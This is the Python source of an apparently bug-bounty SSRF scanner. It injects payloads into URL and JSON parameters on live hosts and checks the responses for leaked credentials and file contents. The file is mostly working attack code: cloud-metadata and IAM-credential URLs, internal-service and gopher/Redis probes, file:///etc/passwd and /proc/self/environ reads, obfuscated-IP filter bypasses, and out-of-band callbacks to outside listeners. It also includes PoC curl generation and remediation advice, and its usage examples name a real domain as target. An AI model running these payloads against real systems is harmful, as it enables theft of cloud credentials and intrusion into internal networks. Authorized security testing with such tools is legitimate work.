#!/usr/bin/env python3
"""
ssrfprobe.py — Server-Side Request Forgery Detection
=====================================================
Author  : RareKez / security research tooling
License : MIT (for authorized use only)

Chains from : jsreaper.py    (--js)    — endpoints + parameters
              apifuzz.py     (--api)   — API endpoints
              reconharvest.py (--scan) — live hosts
              plain list      (--urls) — raw URL list

Feeds into  : Bug bounty reports (standalone SSRF findings)

Pipeline:
  1. Collect injection surface:
       - URL parameters (url=, src=, href=, redirect=, proxy=, fetch=, callback=…)
       - JSON body fields in API endpoints
       - File upload URL fields
       - XML/XXE injection points
  2. Generate OOB callback tokens (interactsh-compatible or DNS-based)
  3. For each injection point, test every payload category:
       a. Cloud metadata (AWS IMDSv1/v2, GCP, Azure)
       b. Internal network probes (localhost, 127.x.x.x, 10.x, 172.16-31.x, 192.168.x)
       c. IP obfuscation bypasses (decimal, octal, hex, IPv6 equivalents)
       d. Protocol scheme abuse (file://, dict://, gopher://, ldap://)
       e. DNS rebinding / URL redirect chains
       f. Blind OOB via interactsh / custom webhook
  4. Detect SSRF via:
       - Response content containing metadata/internal content (reflective)
       - Private IP addresses in response body or error messages
       - OOB DNS/HTTP callback received
       - Response timing anomalies (blind SSRF heuristic)
       - Error messages leaking internal hostnames
  5. Generate JSON + HTML report with PoC curl commands

Usage:
  python3 ssrfprobe.py --js js-findings.json --domain eskimi.com --output ssrf
  python3 ssrfprobe.py --api api-findings.json --domain eskimi.com --output ssrf
  python3 ssrfprobe.py --scan recon-report-v2.json --domain eskimi.com --output ssrf
  python3 ssrfprobe.py --urls targets.txt --domain eskimi.com --output ssrf
  python3 ssrfprobe.py --js js-findings.json --domain eskimi.com \\
    --oob-domain TOKEN.oast.pro --output ssrf
  python3 ssrfprobe.py --js js-findings.json --domain eskimi.com \\
    --webhook https://webhook.site/YOUR-TOKEN --output ssrf

LEGAL: Only use against targets you have explicit written authorization to test.
"""

from __future__ import annotations

import argparse
import asyncio
import datetime
import hashlib
import json
import re
import socket
import sys
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from typing import Any

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import (
        Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    )
    from rich.panel import Panel
    from rich.markup import escape
    HAS_RICH = True
    console = Console()
except ImportError:
    HAS_RICH = False
    console = None

import logging
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger("ssrfprobe")
for _n in ("httpx", "httpcore"):
    logging.getLogger(_n).setLevel(logging.WARNING)


# ═════════════════════════════════════════════════════════════════════════════
# SSRF PARAMETER NAMES  — injection surface
# ═════════════════════════════════════════════════════════════════════════════

# URL / resource parameters commonly passed to server-side HTTP clients
SSRF_PARAM_NAMES: list[str] = [
    # Explicit URL parameters
    "url", "uri", "link", "src", "source", "href",
    "redirect", "redirect_url", "redirect_uri", "next", "return",
    "return_url", "goto", "continue", "target",
    # Fetch / proxy
    "fetch", "proxy", "proxy_url", "request", "load", "get", "data",
    # Webhook / callback
    "webhook", "webhook_url", "callback", "callback_url", "notify",
    "notify_url", "ping", "ping_url", "hook",
    # Import / content
    "import", "import_url", "feed", "feed_url", "image", "img",
    "image_url", "file", "file_url", "doc", "document",
    "content", "content_url", "asset", "asset_url", "media",
    # Path / resource
    "path", "page", "template", "include", "endpoint", "service",
    "host", "origin", "domain", "site", "server",
    # Open redirect variants (often lead to SSRF)
    "ref", "referrer", "return_to", "back", "forward",
    "success", "success_url", "failure", "failure_url",
    "error", "error_url", "cancel", "cancel_url",
]

# JSON body field names that often trigger server-side requests
SSRF_BODY_FIELDS: list[str] = [
    "url", "src", "href", "source", "target", "endpoint",
    "webhook_url", "callback_url", "redirect_url", "notify_url",
    "image_url", "avatar_url", "logo_url", "icon_url",
    "file_url", "document_url", "content_url", "feed_url",
    "import_url", "export_url", "download_url",
    "proxy", "proxy_url", "request_url",
    "host", "hostname", "server", "backend",
]


# ═════════════════════════════════════════════════════════════════════════════
# SSRF PAYLOAD CATALOGUE
# ═════════════════════════════════════════════════════════════════════════════

# Cloud metadata endpoints — reflective SSRF detection
METADATA_PAYLOADS: list[tuple[str, str, str]] = [
    # (payload_url, provider, what_it_returns)
    ("http://169.254.169.254/latest/meta-data/",
     "AWS IMDSv1", "EC2 instance metadata — IAM role, credentials, AMI ID"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "AWS IMDSv1 IAM", "IAM role names — fetch credentials from each role"),
    ("http://169.254.169.254/latest/user-data",
     "AWS user-data", "Cloud-init scripts often contain secrets"),
    ("http://[fd00:ec2::254]/latest/meta-data/",
     "AWS IMDSv1 IPv6", "IPv6-based metadata endpoint bypass"),
    ("http://169.254.169.254/computeMetadata/v1/",
     "GCP metadata", "GCP instance metadata — access tokens, project ID"),
    ("http://metadata.google.internal/computeMetadata/v1/",
     "GCP metadata (DNS)", "GCP metadata via internal DNS name"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "Azure IMDS", "Azure instance metadata — subscription, managed identity"),
    ("http://100.100.100.200/latest/meta-data/",
     "Alibaba Cloud metadata", "Alibaba Cloud ECS instance metadata"),
    ("http://169.254.169.254/metadata/v1/",
     "DigitalOcean metadata", "DigitalOcean droplet metadata"),
]

# Internal network probes — detect access to RFC 1918 addresses
INTERNAL_PROBES: list[tuple[str, str]] = [
    ("http://127.0.0.1/",          "localhost HTTP"),
    ("http://127.0.0.1:22/",       "localhost SSH banner"),
    ("http://127.0.0.1:8080/",     "localhost :8080"),
    ("http://127.0.0.1:8443/",     "localhost :8443"),
    ("http://localhost/",          "localhost by name"),
    ("http://0.0.0.0/",            "0.0.0.0 wildcard"),
    ("http://0/",                  "0 — resolves to 0.0.0.0 on some systems"),
    ("http://10.0.0.1/",           "RFC 1918 10.x gateway"),
    ("http://192.168.1.1/",        "RFC 1918 192.168.x.x gateway"),
    ("http://172.16.0.1/",         "RFC 1918 172.16.x.x"),
    # Common internal services
    ("http://127.0.0.1:6379/",     "Redis on localhost"),
    ("http://127.0.0.1:27017/",    "MongoDB on localhost"),
    ("http://127.0.0.1:9200/",     "Elasticsearch on localhost"),
    ("http://127.0.0.1:5601/",     "Kibana on localhost"),
]

# IP obfuscation bypasses — evade SSRF filters
OBFUSCATION_PAYLOADS: list[tuple[str, str]] = [
    # Decimal encoding: 127.0.0.1 = 2130706433
    ("http://2130706433/",              "127.0.0.1 as decimal"),
    ("http://0177.0.0.1/",             "127.0.0.1 as octal"),
    ("http://0x7f000001/",             "127.0.0.1 as hex"),
    ("http://[::1]/",                   "127.0.0.1 as IPv6 loopback"),
    ("http://[::ffff:127.0.0.1]/",     "IPv4-mapped IPv6 loopback"),
    ("http://[::ffff:7f00:1]/",        "IPv4-mapped IPv6 hex"),
    # Encoding bypasses
    ("http://127.0.0.1%23@evil.com/",  "URL fragment injection"),
    ("http://127.0.0.1%40evil.com/",   "@ in URL userinfo"),
    # Metadata via obfuscated IP
    ("http://2852039166/latest/meta-data/",  "169.254.169.254 as decimal"),
    ("http://0xa9fea9fe/latest/meta-data/",  "169.254.169.254 as hex"),
    ("http://0251.0376.0251.0376/",          "169.254.169.254 as octal"),
    ("http://[::ffff:169.254.169.254]/",     "169.254.169.254 IPv4-mapped IPv6"),
]

# Protocol scheme abuse
SCHEME_PAYLOADS: list[tuple[str, str]] = [
    ("file:///etc/passwd",          "Local file read via file://"),
    ("file:///etc/hosts",           "Local /etc/hosts via file://"),
    ("file:///proc/self/environ",   "Process environment via /proc"),
    ("dict://127.0.0.1:6379/info",  "Redis INFO via dict://"),
    ("gopher://127.0.0.1:6379/_PING%0D%0A",  "Redis PING via gopher://"),
    ("gopher://127.0.0.1:9200/_",   "Elasticsearch via gopher://"),
    ("ldap://127.0.0.1:389/",       "LDAP on localhost via ldap://"),
    ("sftp://127.0.0.1:22/",        "SSH SFTP probe via sftp://"),
    ("tftp://127.0.0.1:69/test",    "TFTP probe via tftp://"),
]

# Patterns indicating SSRF was successful (reflective detection)
SSRF_SUCCESS_PATTERNS: list[tuple[re.Pattern, str, str]] = [
    # (pattern, description, severity)
    (re.compile(r'"Code"\s*:\s*"Success"', re.I),
     "AWS IMDSv1 credential endpoint", "CRITICAL"),
    (re.compile(r'ami-[0-9a-f]{8,17}', re.I),
     "AWS AMI ID in response", "CRITICAL"),
    (re.compile(r'"instanceId"\s*:\s*"i-[0-9a-f]', re.I),
     "AWS instance ID", "CRITICAL"),
    (re.compile(r'"AccessKeyId"\s*:\s*"ASIA|AKIA', re.I),
     "AWS access key in metadata", "CRITICAL"),
    (re.compile(r'iam/security-credentials', re.I),
     "AWS IAM role listing", "CRITICAL"),
    (re.compile(r'"compute\.googleapis\.com"', re.I),
     "GCP compute metadata", "CRITICAL"),
    (re.compile(r'"project-id"\s*:\s*"', re.I),
     "GCP project ID", "HIGH"),
    (re.compile(r'"subscriptionId"\s*:\s*"[0-9a-f-]{36}"', re.I),
     "Azure subscription ID", "CRITICAL"),
    (re.compile(r'"principalId"\s*:\s*"', re.I),
     "Azure managed identity", "CRITICAL"),
    (re.compile(r'root:x:0:0', re.I),
     "/etc/passwd content", "CRITICAL"),
    (re.compile(r'daemon:x:\d+:\d+', re.I),
     "/etc/passwd content", "CRITICAL"),
    (re.compile(r'127\.0\.0\.1\s+localhost', re.I),
     "/etc/hosts content", "HIGH"),
    (re.compile(r'\+PONG', re.I),
     "Redis PONG response (SSRF to Redis)", "CRITICAL"),
    (re.compile(r'"cluster_name"\s*:', re.I),
     "Elasticsearch cluster info", "HIGH"),
    (re.compile(r'"_all_dbs"\s*:\s*\[', re.I),
     "CouchDB database list", "HIGH"),
    (re.compile(r'(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d+\.\d+',
               re.I),
     "Private IP in response (internal probe succeeded)", "HIGH"),
]

# Error messages that suggest SSRF attempted but filtered (still informational)
SSRF_FILTER_PATTERNS: list[re.Pattern] = [
    re.compile(r'ssrf|request.?forgery|blocked.?url|invalid.?url|forbidden.?url', re.I),
    re.compile(r'not.?allowed|restricted|blacklisted|denied', re.I),
    re.compile(r'connect(?:ion)?.?refused|connection.?timed.?out', re.I),
]

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEV_COLOR = {
    "CRITICAL": "bold red", "HIGH": "bold yellow",
    "MEDIUM": "yellow", "LOW": "cyan", "INFO": "dim",
}
SEV_EMOJI = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "⚪"}
UA = "Mozilla/5.0 (compatible; SSRFProbe/1.0)"

# Module-level User-Agent override (C18) — set via --user-agent.
_USER_AGENT = UA


def set_user_agent(value: str) -> None:
    global _USER_AGENT
    _USER_AGENT = value or UA


def user_agent() -> str:
    return _USER_AGENT


# ═════════════════════════════════════════════════════════════════════════════
# DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class InjectionPoint:
    """A single location where an SSRF payload can be injected."""
    host: str
    base_url: str
    param_name: str
    inject_via: str        # "query" | "body_json" | "body_form" | "header" | "path"
    original_value: str    # original value to replace
    method: str = "GET"
    content_type: str = "application/json"


@dataclass
class SSRFFinding:
    host: str
    url: str
    param: str
    payload_url: str
    payload_category: str  # "metadata" | "internal" | "obfuscation" | "scheme" | "oob"
    severity: str
    title: str
    detail: str
    evidence: str
    curl_command: str
    recommendation: str
    cvss_estimate: str = ""
    response_snippet: str = ""
    is_blind: bool = False     # OOB-based detection
    is_reflective: bool = False


@dataclass
class SSRFReport:
    domain: str
    scan_time: str
    source_files: list[str]
    oob_domain: str
    total_injection_points: int = 0
    total_payloads_sent: int = 0
    elapsed_seconds: float = 0.0
    findings: list[SSRFFinding] = field(default_factory=list)


# ═════════════════════════════════════════════════════════════════════════════
# HTTP CLIENT
# ═════════════════════════════════════════════════════════════════════════════

def _curl(
    url: str,
    method: str = "GET",
    headers: dict | None = None,
    body: Any = None,
    extra: str = "",
) -> str:
    parts = ["curl -sk -D - --max-time 15"]
    if method.upper() != "GET":
        parts.append(f"-X {method.upper()}")
    for k, v in (headers or {}).items():
        parts.append(f'-H "{k}: {v}"')
    if body is not None:
        if isinstance(body, dict):
            bstr = json.dumps(body).replace("'", "'\\''")
            parts.append(f"--data-raw '{bstr}'")
            if not headers or "Content-Type" not in headers:
                parts.append('-H "Content-Type: application/json"')
        else:
            parts.append(f"--data-raw '{body}'")
    if extra:
        parts.append(extra)
    parts.append(f'"{url}"')
    return " \\\n  ".join(parts)


async def probe(
    url: str,
    method: str = "GET",
    headers: dict | None = None,
    body: Any = None,
    timeout: float = 12.0,
) -> tuple[int | None, dict, str, float]:
    """
    Make an HTTP request and return (status, headers, body, elapsed_seconds).
    Measures elapsed time for timing-based blind SSRF heuristic.
    Never raises.
    """
    if not HAS_HTTPX:
        return None, {}, "", 0.0
    hdrs = {"User-Agent": user_agent(), **(headers or {})}
    t0 = time.perf_counter()
    try:
        async with httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=False,
        ) as c:
            if method.upper() == "GET":
                resp = await c.get(url, headers=hdrs)
            elif method.upper() == "POST":
                if isinstance(body, dict):
                    resp = await c.post(url, headers=hdrs, json=body)
                else:
                    resp = await c.post(url, headers=hdrs, content=body or "")
            else:
                resp = await c.request(method, url, headers=hdrs)
            elapsed = time.perf_counter() - t0
            return resp.status_code, dict(resp.headers), resp.text[:5000], elapsed
    except httpx.TimeoutException:
        elapsed = time.perf_counter() - t0
        return None, {}, "TIMEOUT", elapsed
    except Exception as exc:
        elapsed = time.perf_counter() - t0
        log.debug(f"[Probe] {url}: {exc}")
        return None, {}, "", elapsed


# ═════════════════════════════════════════════════════════════════════════════
# RESPONSE ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

def analyse_response(body: str) -> list[tuple[str, str, str]]:
    """
    Check response body for SSRF success indicators.
    Returns list of (description, severity, matched_text).
    """
    hits: list[tuple[str, str, str]] = []
    for pat, desc, sev in SSRF_SUCCESS_PATTERNS:
        m = pat.search(body)
        if m:
            hits.append((desc, sev, m.group(0)[:80]))
    return hits


def is_filtered(body: str) -> bool:
    """Return True if the response suggests an SSRF filter is in place."""
    return any(p.search(body) for p in SSRF_FILTER_PATTERNS)


def _private_ip_in_error(body: str, error_msgs: list[str]) -> str | None:
    """
    Check if an internal IP address was leaked in an error message.
    Returns the leaked IP string if found, None otherwise.
    """
    private_pat = re.compile(
        r'(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}'
    )
    m = private_pat.search(body)
    return m.group(0) if m else None


# ═════════════════════════════════════════════════════════════════════════════
# INJECTION SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def find_injection_points_from_url(
    url: str, host: str, method: str = "GET"
) -> list[InjectionPoint]:
    """
    Extract injection points from a URL's query parameters.
    Returns a point for each parameter whose name suggests URL/resource input.
    """
    points: list[InjectionPoint] = []
    parsed = urllib.parse.urlparse(url)
    qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    for param, values in qs.items():
        if param.lower() in SSRF_PARAM_NAMES:
            points.append(InjectionPoint(
                host=host,
                base_url=url,
                param_name=param,
                inject_via="query",
                original_value=values[0] if values else "",
                method=method,
            ))
    return points


def find_injection_points_from_endpoint(
    url: str, host: str, method: str, body_fields: list[str]
) -> list[InjectionPoint]:
    """
    Find SSRF injection points in API endpoint body fields.
    """
    points: list[InjectionPoint] = []
    # Query params
    points.extend(find_injection_points_from_url(url, host, method))
    # Body fields
    for field_name in body_fields:
        if field_name.lower() in SSRF_BODY_FIELDS:
            points.append(InjectionPoint(
                host=host,
                base_url=url,
                param_name=field_name,
                inject_via="body_json",
                original_value="https://example.com",
                method=method or "POST",
                content_type="application/json",
            ))
    return points


# ═════════════════════════════════════════════════════════════════════════════
# PAYLOAD INJECTION
# ═════════════════════════════════════════════════════════════════════════════

def inject_query_param(base_url: str, param: str, value: str) -> str:
    """Replace or add a query parameter value in a URL."""
    parsed = urllib.parse.urlparse(base_url)
    qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_qs = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_qs))


async def send_payload(
    point: InjectionPoint,
    payload_url: str,
    timeout: float,
    extra_headers: dict | None = None,
) -> tuple[int | None, dict, str, float]:
    """
    Send a single SSRF payload to an injection point.
    Handles both query-parameter and JSON-body injection.
    """
    hdrs = {**(extra_headers or {})}

    if point.inject_via == "query":
        test_url = inject_query_param(point.base_url, point.param_name, payload_url)
        return await probe(test_url, point.method, hdrs, timeout=timeout)

    elif point.inject_via == "body_json":
        test_url = point.base_url
        body = {point.param_name: payload_url}
        hdrs["Content-Type"] = "application/json"
        return await probe(test_url, point.method, hdrs, body, timeout=timeout)

    elif point.inject_via == "body_form":
        test_url = point.base_url
        body = urllib.parse.urlencode({point.param_name: payload_url})
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        return await probe(test_url, point.method, hdrs, body, timeout=timeout)

    return None, {}, "", 0.0


def build_curl_for_point(
    point: InjectionPoint,
    payload_url: str,
) -> str:
    if point.inject_via == "query":
        final_url = inject_query_param(point.base_url, point.param_name, payload_url)
        return _curl(final_url, point.method)
    elif point.inject_via == "body_json":
        return _curl(
            point.base_url, point.method,
            headers={"Content-Type": "application/json"},
            body={point.param_name: payload_url},
        )
    return _curl(point.base_url, point.method)


# ═════════════════════════════════════════════════════════════════════════════
# OOB TOKEN GENERATOR
# ═════════════════════════════════════════════════════════════════════════════

def generate_oob_token(host: str, param: str, payload_cat: str) -> str:
    """
    Generate a unique subdomain token for OOB SSRF detection.
    Format: {short_hash}.{oob_domain}
    The hash encodes host+param+category so matches can be correlated.
    """
    raw = f"{host}:{param}:{payload_cat}:{time.time()}"
    token = hashlib.md5(raw.encode()).hexdigest()[:12]
    return token


def build_oob_url(token: str, oob_domain: str, dns_only: bool = False) -> str:
    """Build the OOB probe URL for a token.

    When `dns_only` is True the same hostname is used but the caller marks the
    probe as DNS-resolution-only (some targets egress DNS but not HTTP, so a
    DNS lookup on `<token>.<oob_domain>` is the observable signal)."""
    return f"http://{token}.{oob_domain}/"


# ═════════════════════════════════════════════════════════════════════════════
# INTERACTSH POLLING (optional)
# ═════════════════════════════════════════════════════════════════════════════

async def poll_interactsh(
    api_url: str,
    secret_key: str,
    timeout: float = 10.0,
) -> list[dict]:
    """
    Poll an interactsh server for OOB callback results.
    Returns list of interaction records.
    """
    if not HAS_HTTPX:
        return []
    try:
        async with httpx.AsyncClient(timeout=timeout, verify=False) as c:
            resp = await c.get(
                api_url,
                headers={"Authorization": secret_key}
            )
            if resp.status_code == 200:
                return resp.json().get("data", [])
    except Exception:
        pass
    return []


# ═════════════════════════════════════════════════════════════════════════════
# BASELINE RESPONSE COMPARISON
# ═════════════════════════════════════════════════════════════════════════════

async def get_baseline(
    point: InjectionPoint,
    timeout: float,
) -> tuple[int | None, int, float]:
    """
    Fetch the injection point with its original value (or a harmless placeholder).
    Returns (status, body_len, elapsed_time) for comparison.
    """
    safe_value = point.original_value or "https://www.google.com"
    status, _, body, elapsed = await send_payload(point, safe_value, timeout)
    return status, len(body), elapsed


# ═════════════════════════════════════════════════════════════════════════════
# SSRF TESTER — per injection point
# ═════════════════════════════════════════════════════════════════════════════

class SSRFTester:
    def __init__(
        self,
        domain: str,
        oob_domain: str | None = None,
        webhook_url: str | None = None,
        timeout: float = 12.0,
        test_metadata: bool = True,
        test_internal: bool = True,
        test_obfuscation: bool = True,
        test_schemes: bool = True,
        test_oob: bool = True,
        oob_dns_only: bool = False,
    ):
        self.domain          = domain
        self.oob_domain      = oob_domain
        self.webhook_url     = webhook_url
        self.timeout         = timeout
        self.test_metadata   = test_metadata
        self.test_internal   = test_internal
        self.test_obfuscation = test_obfuscation
        self.test_schemes    = test_schemes
        self.test_oob        = test_oob and (oob_domain or webhook_url)
        self.oob_dns_only    = oob_dns_only
        # Token → (host, param, category) for OOB correlation
        self._oob_tokens: dict[str, tuple[str, str, str]] = {}

    async def test_point(
        self, point: InjectionPoint
    ) -> list[SSRFFinding]:
        findings: list[SSRFFinding] = []

        # Baseline response
        base_status, base_len, base_elapsed = await get_baseline(point, self.timeout)

        # Build payload list based on enabled test categories
        payload_sets: list[tuple[str, list[tuple[str, str]]]] = []
        if self.test_metadata:
            payload_sets.append((
                "metadata",
                [(url, f"{prov}: {desc}") for url, prov, desc in METADATA_PAYLOADS],
            ))
        if self.test_internal:
            payload_sets.append(("internal", INTERNAL_PROBES))
        if self.test_obfuscation:
            payload_sets.append(("obfuscation", OBFUSCATION_PAYLOADS))
        if self.test_schemes:
            payload_sets.append(("scheme", SCHEME_PAYLOADS))

        # OOB payloads
        if self.test_oob:
            token = generate_oob_token(point.host, point.param_name, "oob")
            oob_url = (
                build_oob_url(token, self.oob_domain, dns_only=self.oob_dns_only)
                if self.oob_domain
                else self.webhook_url or ""
            )
            if oob_url:
                self._oob_tokens[token] = (point.host, point.param_name, "oob")
                desc = ("Blind OOB SSRF callback (DNS-only)"
                        if self.oob_dns_only else "Blind OOB SSRF callback")
                payload_sets.append(("oob", [(oob_url, desc)]))

        for category, payloads in payload_sets:
            for payload_url, payload_desc in payloads:
                f = await self._test_single(
                    point, payload_url, payload_desc, category,
                    base_status, base_len, base_elapsed,
                )
                if f:
                    findings.append(f)
                    # For metadata category, stop on first confirmed hit
                    # (avoid hammering cloud metadata with 9 payloads)
                    if category == "metadata" and f.severity == "CRITICAL":
                        break

        return findings

    async def _test_single(
        self,
        point: InjectionPoint,
        payload_url: str,
        payload_desc: str,
        category: str,
        base_status: int | None,
        base_len: int,
        base_elapsed: float,
    ) -> SSRFFinding | None:
        status, resp_hdrs, body, elapsed = await send_payload(
            point, payload_url, self.timeout
        )
        if status is None and body != "TIMEOUT":
            return None

        # ── Timeout heuristic for blind SSRF ─────────────────────────────
        # If the baseline response was fast (<2s) but this payload caused
        # a significant timeout increase, the server likely attempted to
        # connect to the target (blind SSRF).
        is_timeout_based = (
            body == "TIMEOUT" and
            elapsed > 8.0 and
            base_elapsed < 2.0
        )

        # ── Reflective detection ──────────────────────────────────────────
        hits = analyse_response(body) if body and body != "TIMEOUT" else []

        # ── Error-based detection ─────────────────────────────────────────
        # If the response contains a private IP in an error message,
        # the server tried to proxy the request internally.
        leaked_ip = _private_ip_in_error(body, []) if body else None

        # ── Status code change ────────────────────────────────────────────
        # Some SSRF-vulnerable servers return 200 for internal URLs
        # (they fetched the content) vs 400/422 for external URLs.
        status_changed = (
            base_status is not None and
            status != base_status and
            status in (200, 201)
        )

        # ── OOB: mark as pending — actual hit detected externally ─────────
        is_oob = category == "oob" and status is not None

        # ── No indicator — skip ───────────────────────────────────────────
        if not hits and not leaked_ip and not is_timeout_based and not is_oob:
            return None

        # ── Determine severity ────────────────────────────────────────────
        if hits:
            severity = hits[0][1]   # from the pattern match
        elif is_oob:
            severity = "HIGH"
        elif leaked_ip:
            severity = "HIGH"
        elif is_timeout_based:
            severity = "MEDIUM"
        else:
            severity = "MEDIUM"

        # ── Build the finding ─────────────────────────────────────────────
        if hits:
            evidence_detail = (
                f"Response contains: {', '.join(h[0] for h in hits)}\n"
                f"Matched text: {', '.join(h[2] for h in hits)[:200]}"
            )
            title = f"Reflective SSRF — {hits[0][0]}"
        elif leaked_ip:
            evidence_detail = (
                f"Private IP {leaked_ip} appeared in error response after "
                f"injecting payload {payload_url}"
            )
            title = f"SSRF — Internal IP Leaked in Error Response ({leaked_ip})"
        elif is_timeout_based:
            evidence_detail = (
                f"Baseline elapsed: {base_elapsed:.2f}s  "
                f"Payload elapsed: {elapsed:.2f}s  "
                f"Timeout suggests server attempted outbound connection."
            )
            title = f"Possible Blind SSRF — Timing Anomaly on {point.param_name}"
        else:
            listener = self.oob_domain or self.webhook_url
            if self.oob_dns_only:
                evidence_detail = (
                    f"DNS-only OOB payload sent: {payload_url}\n"
                    f"Response: HTTP {status}\n"
                    f"Monitor your DNS listener ({listener}) for a lookup of the "
                    f"subdomain token — no HTTP callback is expected in DNS-only mode."
                )
            else:
                evidence_detail = (
                    f"OOB payload sent: {payload_url}\n"
                    f"Response: HTTP {status}\n"
                    f"Check OOB listener ({listener}) for DNS/HTTP callback."
                )
            title = f"Blind SSRF — OOB Payload Delivered via {point.param_name}"

        recommendation = (
            "Implement a strict URL allowlist for any server-side HTTP requests. "
            "Reject requests to RFC 1918 private ranges, loopback addresses, and "
            "cloud metadata endpoints (169.254.169.254, metadata.google.internal). "
            "Use a separate outbound network interface with no access to internal "
            "services. For cloud deployments, enable IMDSv2 (AWS) to require "
            "session-oriented requests, making metadata unreachable via SSRF."
        )

        return SSRFFinding(
            host=point.host,
            url=point.base_url,
            param=point.param_name,
            payload_url=payload_url,
            payload_category=category,
            severity=severity,
            title=title,
            detail=(
                f"SSRF via parameter '{point.param_name}' ({point.inject_via}) "
                f"on {point.base_url}. Payload: {payload_url}  "
                f"Category: {payload_desc}"
            ),
            evidence=(
                f"Request: {point.method} {point.base_url}\n"
                f"Injection: {point.param_name}={payload_url}\n"
                f"{evidence_detail}"
            ),
            curl_command=build_curl_for_point(point, payload_url),
            recommendation=recommendation,
            cvss_estimate=(
                "9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"
                if severity == "CRITICAL" else
                "8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)"
                if severity == "HIGH" else
                "6.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)"
            ),
            response_snippet=body[:500] if body and body != "TIMEOUT" else "",
            is_blind=is_oob or is_timeout_based,
            is_reflective=bool(hits),
        )


# ═════════════════════════════════════════════════════════════════════════════
# INPUT PARSERS
# ═════════════════════════════════════════════════════════════════════════════

def load_from_jsreaper(path: str, domain: str) -> list[InjectionPoint]:
    """
    Extract injection points from jsreaper.py output.
    Uses extracted endpoints and their parameters.
    """
    points: list[InjectionPoint] = []
    with open(path) as f:
        data = json.load(f)

    for ep_data in data.get("endpoints", []):
        host   = ep_data.get("host", "")
        url    = ep_data.get("endpoint", ep_data.get("url", ""))
        method = ep_data.get("method", "GET")
        params = ep_data.get("params", [])
        if not url or not url.startswith("http"):
            continue
        # Query string injection
        new_points = find_injection_points_from_url(url, host, method)
        # Path param based body injection
        new_points += find_injection_points_from_endpoint(
            url, host, method, params
        )
        points.extend(new_points)

    log.info(f"[Parse] {len(points)} injection points from jsreaper output")
    return points


def load_from_apifuzz(path: str, domain: str) -> list[InjectionPoint]:
    """
    Extract injection points from apifuzz.py output.
    Uses discovered API endpoints and their parameters.
    """
    points: list[InjectionPoint] = []
    with open(path) as f:
        data = json.load(f)

    for hr in data.get("host_results", []):
        for ep_data in hr.get("endpoints_found", []):
            host   = ep_data.get("host", "")
            url    = ep_data.get("url", "")
            method = ep_data.get("method", "GET")
            params = ep_data.get("params", []) + ep_data.get("body_fields", [])
            if not url or not url.startswith("http"):
                continue
            new_points = find_injection_points_from_url(url, host, method)
            new_points += find_injection_points_from_endpoint(
                url, host, method, params
            )
            points.extend(new_points)

    log.info(f"[Parse] {len(points)} injection points from apifuzz output")
    return points


def load_from_recon(path: str, domain: str) -> list[InjectionPoint]:
    """
    From reconharvest output: look at probe_results paths and
    construct injection points for any that contain SSRF param names.
    """
    points: list[InjectionPoint] = []
    with open(path) as f:
        data = json.load(f)

    for hr in data.get("host_reports", []):
        host = hr.get("host", "")
        if not host:
            continue
        # Determine best base URL
        ports = hr.get("open_ports", [])
        if not ports:
            continue
        best  = next((p for p in ports if p.get("scheme") == "https"), ports[0])
        scheme = best.get("scheme", "http")
        port   = best.get("port", 80)
        if (scheme, port) in (("https", 443), ("http", 80)):
            base = f"{scheme}://{host}"
        else:
            base = f"{scheme}://{host}:{port}"

        for pr in hr.get("probe_results", []):
            path_val = pr.get("path", "")
            if not path_val:
                continue
            url = base + path_val
            new_points = find_injection_points_from_url(url, host, "GET")
            points.extend(new_points)

    log.info(f"[Parse] {len(points)} injection points from reconharvest output")
    return points


def load_from_urlfile(path: str, domain: str) -> list[InjectionPoint]:
    """Load raw URL list and extract injection points from each URL."""
    points: list[InjectionPoint] = []
    with open(path) as f:
        for line in f:
            url = line.strip()
            if not url or url.startswith("#"):
                continue
            if not url.startswith("http"):
                url = "https://" + url
            parsed = urllib.parse.urlparse(url)
            host   = parsed.netloc
            new_points = find_injection_points_from_url(url, host, "GET")
            points.extend(new_points)

    log.info(f"[Parse] {len(points)} injection points from URL file")
    return points


# ═════════════════════════════════════════════════════════════════════════════
# REPORTING
# ═════════════════════════════════════════════════════════════════════════════

def print_report(report: SSRFReport) -> None:
    by_sev = {s: [f for f in report.findings if f.severity == s]
              for s in SEVERITY_ORDER}

    if not HAS_RICH:
        print(f"\n=== SSRFProbe: {report.domain} ===")
        print(
            f"Injection points: {report.total_injection_points}  "
            f"Payloads sent: {report.total_payloads_sent}  "
            f"Elapsed: {report.elapsed_seconds:.1f}s"
        )
        for f in sorted(report.findings, key=lambda x: SEVERITY_ORDER.get(x.severity, 9)):
            print(f"\n[{f.severity}] {f.title}")
            print(f"  {f.url}  param={f.param}")
            print(f"  {f.detail[:150]}")
        print()
        return

    border = "red" if by_sev.get("CRITICAL") else "yellow" if by_sev.get("HIGH") else "blue"
    console.print()
    console.print(Panel.fit(
        f"[white]Domain:[/] [cyan]{report.domain}[/]\n"
        f"[white]Scan time:[/] {report.scan_time}\n"
        f"[white]Elapsed:[/] {report.elapsed_seconds:.1f}s\n"
